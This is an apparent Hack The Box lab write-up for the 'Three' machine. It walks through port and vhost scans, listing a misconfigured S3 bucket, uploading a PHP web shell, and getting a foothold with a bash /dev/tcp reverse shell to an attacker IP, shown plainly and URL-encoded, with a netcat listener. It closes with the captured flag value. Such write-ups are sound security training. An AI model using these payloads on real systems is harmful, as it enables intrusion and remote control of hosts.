
# #HTB 


![[Pasted image 20251229105913.png|281]]

# HTB: Three

**Machine IP:** `10.129.227.248`  
**Difficulty:** Very Easy  
**OS:** Linux

---


---

## Step 1: Reconnaissance - Port Scanning

### RustScan Results

```
rustscan -a 10.129.227.248
```

**Open ports discovered:**
- Port 22 (SSH)
- Port 80 (HTTP)

![[Pasted image 20251229130834.png]]






## Step 2: Web Enumeration - Subdomain Discovery

### Gobuster VHost Scan

```
gobuster vhost \
  -u http://thetoppers.htb \
  -w ~/Downloads/subdomains-top1mil-20000.txt \
  --append-domain
```

- **Discovered subdomain:**  `s3.thetoppers.htb`

![[Pasted image 20251229141247.png]]


### S3 Endpoint

Visiting `http://s3.thetoppers.htb` returns:

![[Pasted image 20251229141220.png]]
- This indicates an **S3-compatible object storage service** is running.





## Step 3: AWS CLI Enumeration

### Configure AWS CLI

Since this is a custom S3 endpoint, configure AWS CLI with dummy credentials:
```
aws configure
```

### List S3 Bucket Contents
```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

**Results:**
```
PRE images/
2025-12-29 10:59:53    11952 index.php
```

![[Pasted image 20251229141912.png]]






## Step 4: File Upload - Reverse Shell

### Upload PHP Shell

Create a PHP reverse shell and upload it to the S3 bucket:
![[Pasted image 20251229142308.png]]


### Verify Shell Access

The uploaded file is accessible at `http://thetoppers.htb/shell.php`

Test command execution:
```
http://thetoppers.htb/shell.php?cmd=id
```

![[Pasted image 20251229143047.png]]







## Step 5: Reverse Shell

### Execute Reverse Shell Payload
URL-encoded Payload:
```
# URL-encoded payload: bash -c 'bash -i >& /dev/tcp/10.10.17.101/1337 0>&1'
```

**Full Payload:**
```
http://thetoppers.htb/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.17.101%2F1337+0%3E%261%27
```

![[Pasted image 20251229143653.png]]


### Start Netcat Listener

```
nc -nvlp 1337
```

**Shell received:**
```
connect to [10.10.17.101] from (UNKNOWN)
www-data@three:/var/www/html$
```


## Step 6: Flag Capture

### Navigate to Flag Location

```
www-data@three:/var/www/html$ cd ../../
www-data@three:/var/$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@three:/var/$ cd www
www-data@three:/var/www/$ ls
flag.txt  html
www-data@three:/var/www/$ cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

![[Pasted image 20251229143841.png]]

- **Flag:** `a980d99281a28d638ac68b9bf9453c2b`






## Step 7: Machine Owned


![[Pasted image 20251229144603.png]]


---

## Flags

|Flag|Value|
|---|---|
|Flag|`a980d99281a28d638ac68b9bf9453c2b`|

---

## Credentials Table

|Service|Credential|
|---|---|
|AWS CLI|test:test (dummy credentials)|

---
